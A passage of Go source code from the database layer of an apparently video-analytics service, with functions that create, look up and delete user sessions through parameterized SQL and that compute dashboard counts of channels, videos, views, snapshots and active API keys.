	expiresAt := now.Add(30 * 24 * time.Hour) // 30 days session

	query := `INSERT INTO user_sessions (token, user_id, expires_at, created_at) VALUES (?, ?, ?, ?);`
	if db.DBType == "postgres" {
		query = `INSERT INTO user_sessions (token, user_id, expires_at, created_at) VALUES ($1, $2, $3, $4);`
	}

	_, err := db.Exec(query, token, userID, expiresAt, now)
	if err != nil {
		return nil, err
	}

	return &models.UserSession{
		Token:     token,
		UserID:    userID,
		ExpiresAt: expiresAt,
		CreatedAt: now,
	}, nil
}

func (db *DB) GetUserBySessionToken(token string) (*models.User, error) {
	query := `
		SELECT u.id, u.username, u.password_hash, u.role, u.created_at
		FROM user_sessions s
		JOIN users u ON s.user_id = u.id
		WHERE s.token = ? AND s.expires_at > ?;
	`
	if db.DBType == "postgres" {
		query = `
			SELECT u.id, u.username, u.password_hash, u.role, u.created_at
			FROM user_sessions s
			JOIN users u ON s.user_id = u.id
			WHERE s.token = $1 AND s.expires_at > $2;
		`
	}

	var u models.User
	row := db.QueryRow(query, token, time.Now())
	if err := row.Scan(&u.ID, &u.Username, &u.PasswordHash, &u.Role, &u.CreatedAt); err != nil {
		return nil, err
	}
	return &u, nil
}

func (db *DB) DeleteSession(token string) error {
	query := `DELETE FROM user_sessions WHERE token = ?;`
	if db.DBType == "postgres" {
		query = `DELETE FROM user_sessions WHERE token = $1;`
	}
	_, err := db.Exec(query, token)
	return err
}

func (db *DB) GetDashboardStats() (*models.DashboardStats, error) {
	stats := &models.DashboardStats{}

	// Channel count
	db.QueryRow(`SELECT COUNT(*) FROM channels;`).Scan(&stats.TotalChannels)
	// Video count
	db.QueryRow(`SELECT COUNT(*) FROM videos;`).Scan(&stats.TotalVideos)

	// Total views across latest video snapshots
	db.QueryRow(`SELECT COALESCE(SUM(latest_views), 0) FROM (
		SELECT s.view_count as latest_views
		FROM videos v
		LEFT JOIN (
			SELECT video_id, view_count,
			ROW_NUMBER() OVER (PARTITION BY video_id ORDER BY collected_at DESC) as rn
			FROM video_snapshots
		) s ON v.video_id = s.video_id AND s.rn = 1
	) t;`).Scan(&stats.TotalViews)

	// Total snapshots count
	db.QueryRow(`SELECT COUNT(*) FROM video_snapshots;`).Scan(&stats.TotalSnapshots)

	// Active API Keys count
	db.QueryRow(`SELECT COUNT(*) FROM api_keys WHERE is_active = true;`).Scan(&stats.ActiveAPIKeys)

	// Last collected time
	var lastTime sql.NullTime
	db.QueryRow(`SELECT MAX(collected_at) FROM video_snapshots;`).Scan(&lastTime)
	if lastTime.Valid {
		stats.LastCollectedAt = &lastTime.Time
	}

	return stats, nil
}
